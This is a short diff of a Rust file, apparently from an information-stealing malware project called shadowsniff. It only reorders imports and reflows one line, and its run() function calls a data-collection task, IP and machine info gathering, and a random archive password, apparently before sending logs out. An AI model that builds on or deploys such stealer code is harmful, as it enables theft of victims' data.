@@ -27,20 +27,20 @@ use alloc::format;
 use alloc::string::String;
 use alloc::sync::Arc;
 use alloc::vec::Vec;
-use rand_chacha::ChaCha20Rng;
-use rand_core::RngCore;
 use collector::atomic::AtomicCollector;
 use collector::display::PrimitiveDisplayCollector;
 use filesystem::FileSystem;
 use filesystem::path::Path;
 use filesystem::virtualfs::VirtualFileSystem;
-use ipinfo::{init_ip_info, unwrapped_ip_info, IpInfo};
+use ipinfo::{IpInfo, init_ip_info, unwrapped_ip_info};
+use rand_chacha::ChaCha20Rng;
+use rand_core::RngCore;
+use sender::LogSenderExt;
 use shadowsniff::SniffTask;
 use tasks::Task;
 use utils::pc_info::PcInfo;
 use utils::random::ChaCha20RngExt;
 use zip::ZipArchive;
-use sender::LogSenderExt;
 
 #[inline(always)]
 pub fn run() {
@@ -57,9 +57,7 @@ pub fn run() {
     SniffTask::default().run(out, &fs, &collector);
 
     let password: String = {
-        let charset: Vec<char> = "shadowsniff0123456789"
-            .chars()
-            .collect();
+        let charset: Vec<char> = "shadowsniff0123456789".chars().collect();
         let mut rng = ChaCha20Rng::from_nano_time();
 
         (0..15)
